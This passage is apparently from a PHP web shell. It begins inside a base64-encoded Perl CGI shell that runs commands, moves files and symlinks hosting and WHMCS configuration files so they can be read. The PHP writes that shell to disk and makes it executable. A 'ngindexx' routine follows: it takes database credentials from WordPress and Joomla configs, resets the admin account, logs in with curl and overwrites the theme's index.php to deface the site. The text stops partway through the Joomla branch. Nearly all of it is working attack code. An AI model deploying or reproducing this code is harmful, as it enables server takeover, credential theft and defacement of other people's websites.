ID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQklMTC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9CaWxsL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2JpbGwvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvUFVSQ0hBU0Uvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvUHVyY2hhc2Uvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvcHVyY2hhc2Uvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQUNDT1VOVC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9BY2NvdW50L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2FjY291bnQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvVVNFUi9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9Vc2VyL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3VzZXIvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ0xJRU5UUy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9DbGllbnRzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2NsaWVudHMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQklMTElOR1Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQmlsbGluZ3Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYmlsbGluZ3Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvTVkvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvTXkvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvbXkvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvc2VjdXJlL3dobS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9zZWN1cmUvd2htY3Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvcGFuZWwvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY2xpZW50ZXMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY2xpZW50ZS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9zdXBwb3J0L29yZGVyL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSApOyBmb3JlYWNoIChAYXJyYXkpeyBteSAkY29uZmlnbnlhID0gJF8tPntjb25maWdkaXJ9OyBteSAkdHlwZWNvbmZpZyA9ICRfLT57dHlwZX07IHN5bWxpbmsoIiRjb25maWdueWEiLCJzeW1saW5rX2NvbmZpZy8kdXNlcm55YS0kdHlwZWNvbmZpZy50eHQiKTsgbWtkaXIgInN5bWxpbmtfY29uZmlnLyR1c2VybnlhLSR0eXBlY29uZmlnLnR4dDQwNCI7IHN5bWxpbmsoIiRjb25maWdueWEiLCJzeW1saW5rX2NvbmZpZy8kdXNlcm55YS0kdHlwZWNvbmZpZy50eHQ0MDQvcHBxLnR4dCIpOyBjb3B5KCJzeW1saW5rX2NvbmZpZy9uZW11LnR4dCIsInN5bWxpbmtfY29uZmlnLyR1c2VybnlhLSR0eXBlY29uZmlnLnR4dDQwNC8uaHRhY2Nlc3MiKSA7IH0gfSBwcmludCAic3VjY2VzcyI7DQp9DQpzdWIgSGVscA0Kew0KcHJpbnQgIjxjb2RlPiBIb3cgVG8gVXNlciBTeW1saW5rICsgQ29uZmlnIEdyYWJiZXI/IEp1c3QgS2xpayBTeW1saW5rICsgQ29uZmlnIEdyYWJiZXI8YnI+IjsNCnByaW50ICIgVGhlbiBDaGVjayBEaXJzIEJ5IEVudGVyIFRoZSBVUkw8YnI+IjsNCnByaW50ICIgRXhhbXBsZTogc2l0ZS5jb20vY2dpZGlycy9zeW1saW5rX2NvbmZpZzxicj4iOw0KcHJpbnQgIiBGb3IgU3ltbGluayBKdXN0IEFkZCBJbiBVcmw8YnI+IjsNCnByaW50ICIgRXhhbXBsZTogc2l0ZS5jb20vY2dpZGlycy9zeW1saW5rX2NvbmZpZy9yb290LzwvY29kZT4iOw0KfQ0Kc3ViIFNlbmRGaWxlVG9Ccm93c2VyDQp7DQpsb2NhbCgkU2VuZEZpbGUpID0gQF87DQppZihvcGVuKFNFTkRGSUxFLCAkU2VuZEZpbGUpKSAjIGZpbGUgb3BlbmVkIGZvciByZWFkaW5nDQp7DQppZigkV2luTlQpDQp7DQpiaW5tb2RlKFNFTkRGSUxFKTsNCmJpbm1vZGUoU1RET1VUKTsNCn0NCiRGaWxlU2l6ZSA9IChzdGF0KCRTZW5kRmlsZSkpWzddOw0KKCRGaWxlbmFtZSA9ICRTZW5kRmlsZSkgPX4gbSEoW14vXlxcXSopJCE7DQpwcmludCAiQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXVua25vd25cbiI7DQpwcmludCAiQ29udGVudC1MZW5ndGg6ICRGaWxlU2l6ZVxuIjsNCnByaW50ICJDb250ZW50LURpc3Bvc2l0aW9uOiBhdHRhY2htZW50OyBmaWxlbmFtZT0kMVxuXG4iOw0KcHJpbnQgd2hpbGUoPFNFTkRGSUxFPik7DQpjbG9zZShTRU5ERklMRSk7DQp9DQplbHNlICMgZmFpbGVkIHRvIG9wZW4gZmlsZQ0Kew0KJlByaW50UGFnZUhlYWRlcigiZiIpOw0KcHJpbnQgIjxjb2RlPkZhaWxlZCB0byBkb3dubG9hZCAkU2VuZEZpbGU6ICQhPC9jb2RlPiI7DQomUHJpbnRGaWxlRG93bmxvYWRGb3JtOw0KJlByaW50UGFnZUZvb3RlcjsNCn0NCn0NCg0KDQpzdWIgQmVnaW5Eb3dubG9hZA0Kew0KIyBnZXQgZnVsbHkgcXVhbGlmaWVkIHBhdGggb2YgdGhlIGZpbGUgdG8gYmUgZG93bmxvYWRlZA0KaWYoKCRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlxcfF4uOi8pKSB8DQooISRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlwvLykpKSAjIHBhdGggaXMgYWJzb2x1dGUNCnsNCiRUYXJnZXRGaWxlID0gJFRyYW5zZmVyRmlsZTsNCn0NCmVsc2UgIyBwYXRoIGlzIHJlbGF0aXZlDQp7DQpjaG9wKCRUYXJnZXRGaWxlKSBpZigkVGFyZ2V0RmlsZSA9ICRDdXJyZW50RGlyKSA9fiBtL1tcXFwvXSQvOw0KJFRhcmdldEZpbGUgLj0gJFBhdGhTZXAuJFRyYW5zZmVyRmlsZTsNCn0NCg0KaWYoJE9wdGlvbnMgZXEgImdvIikgIyB3ZSBoYXZlIHRvIHNlbmQgdGhlIGZpbGUNCnsNCiZTZW5kRmlsZVRvQnJvd3NlcigkVGFyZ2V0RmlsZSk7DQp9DQplbHNlICMgd2UgaGF2ZSB0byBzZW5kIG9ubHkgdGhlIGxpbmsgcGFnZQ0Kew0KJlByaW50RG93bmxvYWRMaW5rUGFnZSgkVGFyZ2V0RmlsZSk7DQp9DQp9DQpzdWIgVXBsb2FkRmlsZQ0Kew0KIyBpZiBubyBmaWxlIGlzIHNwZWNpZmllZCwgcHJpbnQgdGhlIHVwbG9hZCBmb3JtIGFnYWluDQppZigkVHJhbnNmZXJGaWxlIGVxICIiKQ0Kew0KJlByaW50UGFnZUhlYWRlcigiZiIpOw0KJlByaW50RmlsZVVwbG9hZEZvcm07DQomUHJpbnRQYWdlRm9vdGVyOw0KcmV0dXJuOw0KfQ0KJlByaW50UGFnZUhlYWRlcigiYyIpOw0KDQojIHN0YXJ0IHRoZSB1cGxvYWRpbmcgcHJvY2Vzcw0KcHJpbnQgIjxjb2RlPlVwbG9hZGluZyAkVHJhbnNmZXJGaWxlIHRvICRDdXJyZW50RGlyLi4uPGJyPiI7DQoNCiMgZ2V0IHRoZSBmdWxsbHkgcXVhbGlmaWVkIHBhdGhuYW1lIG9mIHRoZSBmaWxlIHRvIGJlIGNyZWF0ZWQNCmNob3AoJFRhcmdldE5hbWUpIGlmICgkVGFyZ2V0TmFtZSA9ICRDdXJyZW50RGlyKSA9fiBtL1tcXFwvXSQvOw0KJFRyYW5zZmVyRmlsZSA9fiBtIShbXi9eXFxdKikkITsNCiRUYXJnZXROYW1lIC49ICRQYXRoU2VwLiQxOw0KDQokVGFyZ2V0RmlsZVNpemUgPSBsZW5ndGgoJGlueydmaWxlZGF0YSd9KTsNCiMgaWYgdGhlIGZpbGUgZXhpc3RzIGFuZCB3ZSBhcmUgbm90IHN1cHBvc2VkIHRvIG92ZXJ3cml0ZSBpdA0KaWYoLWUgJFRhcmdldE5hbWUgJiYgJE9wdGlvbnMgbmUgIm92ZXJ3cml0ZSIpDQp7DQpwcmludCAiRmFpbGVkOiBEZXN0aW5hdGlvbiBmaWxlIGFscmVhZHkgZXhpc3RzLjxicj4iOw0KfQ0KZWxzZSAjIGZpbGUgaXMgbm90IHByZXNlbnQNCnsNCmlmKG9wZW4oVVBMT0FERklMRSwgIj4kVGFyZ2V0TmFtZSIpKQ0Kew0KYmlubW9kZShVUExPQURGSUxFKSBpZiAkV2luTlQ7DQpwcmludCBVUExPQURGSUxFICRpbnsnZmlsZWRhdGEnfTsNCmNsb3NlKFVQTE9BREZJTEUpOw0KcHJpbnQgIlRyYW5zZmVyZWQgJFRhcmdldEZpbGVTaXplIEJ5dGVzLjxicj4iOw0KcHJpbnQgIkZpbGUgUGF0aDogJFRhcmdldE5hbWU8YnI+IjsNCn0NCmVsc2UNCnsNCnByaW50ICJGYWlsZWQ6ICQhPGJyPiI7DQp9DQp9DQpwcmludCAiPC9jb2RlPiI7DQomUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsNCiZQcmludFBhZ2VGb290ZXI7DQp9DQoNCnN1YiBEb3dubG9hZEZpbGUNCnsNCiMgaWYgbm8gZmlsZSBpcyBzcGVjaWZpZWQsIHByaW50IHRoZSBkb3dubG9hZCBmb3JtIGFnYWluDQppZigkVHJhbnNmZXJGaWxlIGVxICIiKQ0Kew0KJlByaW50UGFnZUhlYWRlcigiZiIpOw0KJlByaW50RmlsZURvd25sb2FkRm9ybTsNCiZQcmludFBhZ2VGb290ZXI7DQpyZXR1cm47DQp9DQoNCiMgZ2V0IGZ1bGx5IHF1YWxpZmllZCBwYXRoIG9mIHRoZSBmaWxlIHRvIGJlIGRvd25sb2FkZWQNCmlmKCgkV2luTlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cXHxeLjovKSkgfA0KKCEkV2luTlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cLy8pKSkgIyBwYXRoIGlzIGFic29sdXRlDQp7DQokVGFyZ2V0RmlsZSA9ICRUcmFuc2ZlckZpbGU7DQp9DQplbHNlICMgcGF0aCBpcyByZWxhdGl2ZQ0Kew0KY2hvcCgkVGFyZ2V0RmlsZSkgaWYoJFRhcmdldEZpbGUgPSAkQ3VycmVudERpcikgPX4gbS9bXFxcL10kLzsNCiRUYXJnZXRGaWxlIC49ICRQYXRoU2VwLiRUcmFuc2ZlckZpbGU7DQp9DQoNCmlmKCRPcHRpb25zIGVxICJnbyIpICMgd2UgaGF2ZSB0byBzZW5kIHRoZSBmaWxlDQp7DQomU2VuZEZpbGVUb0Jyb3dzZXIoJFRhcmdldEZpbGUpOw0KfQ0KZWxzZSAjIHdlIGhhdmUgdG8gc2VuZCBvbmx5IHRoZSBsaW5rIHBhZ2UNCnsNCiZQcmludERvd25sb2FkTGlua1BhZ2UoJFRhcmdldEZpbGUpOw0KfQ0KfQ0KDQomUmVhZFBhcnNlOw0KJkdldENvb2tpZXM7DQoNCiRTY3JpcHRMb2NhdGlvbiA9ICRFTlZ7J1NDUklQVF9OQU1FJ307DQokU2VydmVyTmFtZSA9ICRFTlZ7J1NFUlZFUl9OQU1FJ307DQokUnVuQ29tbWFuZCA9ICRpbnsnYyd9Ow0KJFRyYW5zZmVyRmlsZSA9ICRpbnsnZid9Ow0KJE9wdGlvbnMgPSAkaW57J28nfTsNCg0KJEFjdGlvbiA9ICRpbnsnYSd9Ow0KJEFjdGlvbiA9ICJjb21tYW5kIiBpZigkQWN0aW9uIGVxICIiKTsNCg0KIyBnZXQgdGhlIGRpcmVjdG9yeSBpbiB3aGljaCB0aGUgY29tbWFuZHMgd2lsbCBiZSBleGVjdXRlZA0KJEN1cnJlbnREaXIgPSAkaW57J2QnfTsNCmNob3AoJEN1cnJlbnREaXIgPSBgJENtZFB3ZGApIGlmKCRDdXJyZW50RGlyIGVxICIiKTsNCmlmKCRBY3Rpb24gZXEgImNvbW1hbmQiKSAjIHVzZXIgd2FudHMgdG8gcnVuIGEgY29tbWFuZA0Kew0KJkV4ZWN1dGVDb21tYW5kOw0KfQ0KZWxzaWYoJEFjdGlvbiBlcSAidXBsb2FkIikgIyB1c2VyIHdhbnRzIHRvIHVwbG9hZCBhIGZpbGUNCnsNCiZVcGxvYWRGaWxlOw0KfQ0KZWxzaWYoJEFjdGlvbiBlcSAiZG93bmxvYWQiKSAjIHVzZXIgd2FudHMgdG8gZG93bmxvYWQgYSBmaWxlDQp7DQomRG93bmxvYWRGaWxlOw0KfQ0KZWxzaWYoJEFjdGlvbiBlcSAic3ltY29uZmlnIikNCnsNCiZQcmludFBhZ2VIZWFkZXI7DQpwcmludCAmU3ltQ29uZmlnOw0KfWVsc2lmKCRBY3Rpb24gZXEgImhlbHAiKQ0Kew0KJlByaW50UGFnZUhlYWRlcjsNCnByaW50ICZIZWxwOw0KfQ==";
	$cgi = fopen($file_cgi, "w");
	fwrite($cgi, base64_decode($cgi_script));
	fwrite($htcgi, $isi_htcgi);
	chmod($file_cgi, 0755);
        chmod($memeg, 0755);
	echo "<br><center>Done ... <a href='ia_cgi/cgi2.SHENZYY' target='_blank'>Klik Here</a>";
} 


 elseif($_GET['do'] == 'ngindexx') {
	{error_reporting(0);function entre2v2($text,$marqueurDebutLien,$marqueurFinLien,$i=1){$ar0=explode($marqueurDebutLien, $text);$ar1=explode($marqueurFinLien, $ar0[$i]);return trim($ar1[0]);}function randomt() {$chars = "abcdefghijkmnopqrstuvwxyz023456789";srand((double)microtime()*1000000);$i = 0;$pass = '';while ($i <= 7) {$num = rand() % 33;$tmp = substr($chars, $num, 1);$pass = $pass . $tmp;$i++;}return $pass;}function index_changer_wp($conf, $content) {$output = '';$dol = '$';$go = 0;$username = entre2v2($conf,"define('DB_USER', '","');");$password = entre2v2($conf,"define('DB_PASSWORD', '","');");$dbname = entre2v2($conf,"define('DB_NAME', '","');");$prefix = entre2v2($conf,$dol."table_prefix  = '","'");$host = entre2v2($conf,"define('DB_HOST', '","');");$link=mysql_connect($host,$username,$password);if($link) {mysql_select_db($dbname,$link) ;$dol = '$';$req1 = mysql_query("UPDATE `".$prefix."users` SET `user_login` = 'admin',`user_pass` = '4297f44b13955235245b2497399d7a93' WHERE `ID` = 1");} else {$output.= "[-] DB Error<br />";}if($req1) {$req = mysql_query("SELECT * from  `".$prefix."options` WHERE option_name='home'");$data = mysql_fetch_array($req);$site_url=$data["option_value"]; $req = mysql_query("SELECT * from  `".$prefix."options` WHERE option_name='template'");$data = mysql_fetch_array($req);$template = $data["option_value"];$req = mysql_query("SELECT * from  `".$prefix."options` WHERE option_name='current_theme'");$data = mysql_fetch_array($req);$current_theme = $data["option_value"];$useragent="Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; Alexa Toolbar; .NET CLR 2.0.50727)";$url2=$site_url."/wp-login.php";$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $url2);curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS,"log=admin&pwd=123123&rememberme=forever&wp-submit=Log In&testcookie=1");curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);curl_setopt($ch, CURLOPT_USERAGENT, $useragent);curl_setopt($ch, CURLOPT_COOKIEJAR, "COOKIE.txt");curl_setopt($ch, CURLOPT_COOKIEFILE, "COOKIE.txt");$buffer = curl_exec($ch);$pos = strpos($buffer,"action=logout");if($pos === false) {$output.= "[-] Login Error<br />";} else {$output.= "[+] Login Successful<br />";$go = 1;}if($go) {$cond = 0;$url2=$site_url."/wp-admin/theme-editor.php?file=/themes/".$template.'/index.php&theme='.urlencode($current_theme).'&dir=theme';curl_setopt($ch, CURLOPT_URL, $url2);curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_USERAGENT, $useragent);curl_setopt($ch, CURLOPT_COOKIEJAR, "COOKIE.txt");curl_setopt($ch, CURLOPT_COOKIEFILE, "COOKIE.txt");$buffer0 = curl_exec($ch);$_wpnonce = entre2v2($buffer0,'<input type="hidden" id="_wpnonce" name="_wpnonce" value="','" />');$_file = entre2v2($buffer0,'<input type="hidden" name="file" value="','" />');if(substr_count($_file,"/index.php") != 0){$output.= "[+] index.php loaded in Theme Editor<br />";$url2=$site_url."/wp-admin/theme-editor.php";curl_setopt($ch, CURLOPT_URL, $url2);curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS,"newcontent=".base64_decode($content)."&action=update&file=".$_file."&_wpnonce=".$_wpnonce."&submit=Update File");curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_USERAGENT, $useragent);curl_setopt($ch, CURLOPT_COOKIEJAR, "COOKIE.txt");curl_setopt($ch, CURLOPT_COOKIEFILE, "COOKIE.txt");$buffer = curl_exec($ch);curl_close($ch);$pos = strpos($buffer,'<div id="message" class="updated">');if($pos === false) {$output.= "[-] Updating Index.php Error<br />";} else {$output.= "[+] Index.php Updated Successfuly<br />";$hk = explode('public_html',$_file);$output.= '[+] Deface '.file_get_contents($site_url.str_replace('/blog','',$hk[1]));$cond = 1;}} else {$url2=$site_url.'/wp-admin/theme-editor.php?file=index.php&theme='.$template;curl_setopt($ch, CURLOPT_URL, $url2);curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_USERAGENT, $useragent);curl_setopt($ch, CURLOPT_COOKIEJAR, "COOKIE.txt");curl_setopt($ch, CURLOPT_COOKIEFILE, "COOKIE.txt");$buffer0 = curl_exec($ch);$_wpnonce = entre2v2($buffer0,'<input type="hidden" id="_wpnonce" name="_wpnonce" value="','" />');$_file = entre2v2($buffer0,'<input type="hidden" name="file" value="','" />');if(substr_count($_file,"index.php") != 0){$output.= "[+] index.php loaded in Theme Editor<br />";$url2=$site_url."/wp-admin/theme-editor.php";curl_setopt($ch, CURLOPT_URL, $url2);curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS,"newcontent=".base64_decode($content)."&action=update&file=".$_file."&theme=".$template."&_wpnonce=".$_wpnonce."&submit=Update File");curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_USERAGENT, $useragent);curl_setopt($ch, CURLOPT_COOKIEJAR, "COOKIE.txt");curl_setopt($ch, CURLOPT_COOKIEFILE, "COOKIE.txt");$buffer = curl_exec($ch);curl_close($ch);$pos = strpos($buffer,'<div id="message" class="updated">');if($pos === false) {$output.= "[-] Updating Index.php Error<br />";} else {$output.= "[+] Index.php Template Updated Successfuly<br />";$output.= '[+] Deface '.file_get_contents($site_url.'/wp-content/themes/'.$template.'/index.php');$cond = 1;}} else {$output.= "[-] index.php can not load in Theme Editor<br />";}}}} else {$output.= "[-] DB Error<br />";}global $base_path;unlink($base_path.'COOKIE.txt');return array('cond'=>$cond, 'output'=>$output);}function index_changer_joomla($conf, $content, $domain) {$doler = '$';$username = entre2v2($conf, $doler."user = '", "';");$password = entre2v2($conf, $doler."password = '", "';");$dbname = entre2v2($conf, $doler."db = '", "';");$prefix = entre2v2($conf, $doler."dbprefix = '", "';");$host = entre2v2($conf, $doler."host = '","';");$co=randomt();$site_url = "http://".$domain."/administrator";$output = '';$cond = 0; $link=mysql_connect($host, $username, $password);if($link) {mysql_select_db($dbname,$link) ;$req1 = mysql_query("UPDATE `".$prefix."users` SET `username` ='admin' , `password` = '4297f44b13955235245b2497399d7a93', `usertype` = 'Super Administrator', `block` = 0");$req = mysql_numrows(mysql_query("SHOW TABLES LIKE '".$prefix."extensions'"));} else {$output.= "[-] DB Error<br />";}if($req1){if ($req) {$req = mysql_query("SELECT * from  `".$prefix."template_styles` WHERE `client_id` = '0' and `home` = '1'");$data = mysql_fetch_array($req);$template_name = $data["template"];$req = mysql_query("SELECT * from  `".$prefix."extensions` WHERE `name`='".$template_name."' or `element` = '".$template_name."'");$data = mysql_fetch_array($req);$template_id = $data["extension_id"];$url2=$site_url."/index.php";$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $url2);curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_USERAGENT, $useragent);curl_setopt($ch, CURLOPT_COOKIEJAR, $co); curl_setopt($ch, CURLOPT_COOKIEFILE, $co); $buffer = curl_exec($ch);$return = entre2v2($buffer ,'<input type="hidden" name="return" value="','"');$hidden = entre2v2($buffer ,'<input type="hidden" name="','" value="1"',4);if($return && $hidden) {curl_setopt($ch, CURLOPT_URL, $url2);curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_REFERER, $url2);curl_setopt($ch, CURLOPT_POSTFIELDS, "username=admin&passwd=123123&option=com_login&task=login&return=".$return."&".$hidden."=1");curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_USERAGENT, $useragent);curl_setopt($ch, CURLOPT_COOKIEJAR, $co); curl_setopt($ch, CURLOPT_COOKIEFILE, $co); $buffer = curl_exec($ch);$pos = strpos($buffer,"com_config");if($pos === false) {$output.= "[-] Login Error<br />";} else {$output.= "[+] Login Successful<br />";}}if($pos){$url2=$site_url."/index.php?option=com_templates&task=source.edit&id=".base64_encode($template_id.":index.php");$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $url2);curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_USERAGENT, $useragent);curl_setopt($ch, CURLOPT_COOKIEJAR, $co); curl_setopt($ch, CURLOPT_COOKIEFILE, $co); $buffer = curl_exec($ch);$hidden2=entre2v2($buffer ,'<input type="hidden" name="','" value="1"',2);if($hidden2) {$output.= "[+] index.php file found in Theme Editor<br />";} else {$output.= "[-] index.php Not found in Theme Editor<br />";}}if($hidden2) {$url2=$site_url."/index.php?option=com_templates&layout=edit";$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $url2);curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS,"jform[source]=".$content."&jform[filename]=index.php&jform[extension_id]=".$template_id."&".$hidden2."=1&task=source.save");curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_USERAGENT, $useragent);curl_setopt($ch, CURLOPT_COOKIEJAR, $co); curl_setopt($ch, CURLOPT_COOKIEFILE, $co); $buffer = curl_exec($ch);curl_close($ch);$pos = strpos($buffer,'<dd class="message message">');$cond = 0;if($pos === false) {$output.= "[-] Updating Index.php Error<br />";} else {$output.= "[+] Index.php Template successfully saved<br />";$cond = 1;}}} else {$req =mysql_query("SELECT * from  `".$prefix."templates_menu` WHERE client_id='0'");$data = mysql_fetch_array($req);$template_name=$data["template"];$useragent="Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; Alexa Toolbar; .NET CLR 2.0.50727)";$url2=$site_url."/index.php";$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $url2);curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);curl_setopt($ch, CURLOPT_USERAGENT, $useragent);curl_setopt($ch, CURLOPT_COOKIEJAR, $co); curl_setopt($ch, CURLOPT_COOKIEFILE, $co); $buffer = curl_exec($ch);$hidden=entre2v2($buffer ,'<input type="hidden" name="','" value="1"',3);if($hidden) {curl_setopt($ch, CURLOPT_URL, $url2);curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS,"username=admin&passwd=123456&option=com_login&task=login&".$hidden."=1");curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_USERAGENT, $useragent);curl_setopt($ch, CURLOPT_COOKIEJAR, $co); curl_setopt($ch, CURLOPT_COOKIEFILE, $co); $buffer = curl_exec($ch);$pos = strpos($buffer,"com_config");if($pos === false) {$output.= "[-] Login Error<br />";} else {$output.= "[+] Login Successful<br />";}}if($pos) 